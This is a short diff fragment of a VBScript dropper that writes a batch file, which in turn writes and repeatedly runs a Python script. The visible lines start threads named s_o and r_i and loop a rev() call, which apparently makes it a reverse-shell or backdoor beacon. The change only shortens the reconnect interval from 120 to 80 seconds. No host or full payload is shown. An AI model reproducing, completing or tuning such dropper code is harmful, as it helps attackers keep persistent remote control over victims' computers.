@@ -61,7 +61,7 @@ Do
             objFile.WriteLine "        echo    threading.Thread^(target=s_o, daemon=True^).start^(^)"
             objFile.WriteLine "        echo    threading.Thread^(target=r_i, daemon=True^).start^(^)"
             objFile.WriteLine "        echo."
-            objFile.WriteLine "        echo    time.sleep^(120^)"
+            objFile.WriteLine "        echo    time.sleep^(80^)"
             objFile.WriteLine "        echo."
             objFile.WriteLine "        echo while True^:"
             objFile.WriteLine "        echo    rev^(^)"
@@ -69,7 +69,7 @@ Do
             objFile.WriteLine "    ) > %FILE%"
             objFile.WriteLine ") else ("
             objFile.WriteLine "   python %FILE%"
-            objFile.WriteLine "   timeout /t 120 >nul"
+            objFile.WriteLine "   timeout /t 80 >nul"
             objFile.WriteLine ")"
             objFile.WriteLine "goto loop"
 
